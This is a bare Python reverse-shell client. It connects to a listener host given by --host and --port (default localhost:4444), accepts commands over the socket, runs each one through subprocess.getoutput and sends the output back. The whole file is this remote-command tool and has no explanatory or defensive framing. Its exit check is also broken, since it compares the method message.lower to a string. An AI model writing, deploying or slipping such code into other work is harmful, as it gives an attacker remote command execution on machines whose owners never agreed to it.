#!/usr/bin/python

import os
import socket
import subprocess
import sys
import argparse 

parser = argparse.ArgumentParser()
parser.add_argument("--host", required=False, default='localhost')
parser.add_argument("--port", type=int, required=False, default=4444)
parser.add_argument("--buffer_size", type=int, required=False, default=1024)
args = parser.parse_args()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((args.host, args.port)) # phone home to the host running listener.py

# receive the banner
message = s.recv(args.buffer_size).decode()
print("[+] Listener: %s" % message)

s.send(str.encode("[*] Connection Established!")) # send a connection ACK banner back to the server.

while True:
    message = s.recv(args.buffer_size).decode() # recieve shell commands from the stream.
    if message:
        print("[+] Command rcvd: %s" % message )
    if message.lower == "exit": 
        print("[+] Exit rcvd. Ciao")
        break
    output = subprocess.getoutput(message)
    s.send(output.encode())

# close connection to listener.py host
s.close()

